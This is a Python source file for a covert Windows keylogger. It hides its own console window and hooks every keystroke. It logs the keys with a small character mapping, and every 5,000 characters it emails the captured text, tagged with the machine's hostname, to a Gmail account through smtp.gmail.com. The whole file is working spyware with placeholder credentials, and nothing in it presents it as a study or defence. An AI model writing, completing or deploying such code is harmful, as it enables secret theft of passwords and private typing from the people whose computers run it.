import smtplib
import pyHook, pythoncom, sys, logging, win32console, win32api, win32gui, os
import socket
from threading import Thread

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

txt = ""
char_count = 0
#emails file
def SendFile():
    global txt
    #print(type(txt))
    mail = smtplib.SMTP('smtp.gmail.com',587)#587
    mail.ehlo()
    mail.starttls()
    #mail.ehlo()
    #sending email
    mail.login('SENDER@gmail.com','PASSWORD')
    message = 'Subject: {}\n\n{}'.format(socket.gethostname(), txt)
    mail.sendmail('SENDER@gmail.com','RECEIVER@gmail.com', message)
    txt = ""
    mail.close()
    
    #python = sys.executable
    #os.execl(python, python, * sys.argv)

#A little bit of formatting... very little
def OnKeyboardEvent(event):
    global txt
    global char_count
    mappings = {None: "<backspace>", 8: "<del>", 13: "\n", 27: "<esc>", 32: " ", 46: "<del>", 91: "<win>",
                160: "<shft>", 162: "<ctr>", 164: "<alt>", 165: "<ralt>", 9: "<tab>",
                48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
                37: "←", 38: "↑", 39: "→", 40: "↓",
                192: "ö", 222: "ä", 186: "ü", 187: "+", 191: "#",
                188: ",", 190: ".", 189: "-", 219: "ß", 221: "´",
                }
    try:
        id = event.KeyID
        char = mappings.get(id, chr(id).lower())
        if not id in mappings and not char.isalpha():
            char = "<%s,%s>" % (char, str(event.KeyID))
    except Exception as e:
        logging.exception(e)
    txt += char
    char_count += 1
    if(char_count > 5000):
        thread = Thread(target=SendFile)
        thread.start()
        #SendFile()
        char_count = 0
    return(event.KeyID)

#Collects keys
while True:
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

